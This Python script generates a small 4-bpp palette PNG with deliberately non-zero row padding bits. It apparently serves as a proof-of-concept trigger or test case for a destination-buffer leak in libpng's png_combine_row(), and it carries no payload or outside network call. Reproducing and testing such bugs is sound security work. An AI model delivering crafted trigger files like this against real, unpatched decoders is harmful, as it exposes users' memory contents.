#!/usr/bin/env python3
# Build a minimal 4-bpp palette PNG whose width forces sub-byte padding
# at the end of every scanline. Decoding this image with an unpatched
# libpng exposes the destination-buffer leak in png_combine_row().
#
# Geometry: 9 px wide, 4 px tall, 4 bpp.
#   row stride = ceil(9 * 4 / 8) = 5 bytes
#   bits used  = 9 * 4 = 36, padding bits per row = 4 (low nibble of byte 4)
#
# Output: trigger.png in the script's directory.

import os, struct, zlib

W, H, BPP = 9, 4, 4
ROWBYTES = (W * BPP + 7) // 8                       # 5

# 16-entry palette (4 bpp -> up to 16 colours), simple gradient.
PALETTE = bytes(v for i in range(16) for v in (i*16, i*16, i*16))

def chunk(tag, data):
    return (struct.pack(">I", len(data))
            + tag + data
            + struct.pack(">I", zlib.crc32(tag + data) & 0xffffffff))

# Build raw scanlines: filter byte (0 = None) + packed pixels.
# Set the four padding bits in the last byte of every row to 0xF so that
# the file deterministically contains non-zero padding. Whatever libpng
# does to those bits is then *its* doing, not the encoder's.
raw = bytearray()
for y in range(H):
    raw.append(0)                                   # filter: None
    # Pixels: indices 1..9 cycling, just so there is data to see.
    pixels = [(y + x + 1) & 0x0f for x in range(W)]
    # Pack two 4-bit pixels per byte, big-endian (high nibble first).
    for i in range(0, W - 1, 2):
        raw.append((pixels[i] << 4) | pixels[i + 1])
    # Last (odd) pixel in high nibble, padding nibble = 0xF (non-zero!)
    raw.append((pixels[-1] << 4) | 0x0F)

ihdr = struct.pack(">IIBBBBB", W, H, BPP, 3, 0, 0, 0)   # palette type 3
idat = zlib.compress(bytes(raw), 9)

png = (b"\x89PNG\r\n\x1a\n"
       + chunk(b"IHDR", ihdr)
       + chunk(b"PLTE", PALETTE)
       + chunk(b"IDAT", idat)
       + chunk(b"IEND", b""))

out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "trigger.png")
with open(out, "wb") as f:
    f.write(png)

print(f"wrote {out} ({W}x{H}, {BPP} bpp, rowbytes={ROWBYTES}, "
      f"padding bits/row=4, encoded as 0xF)")
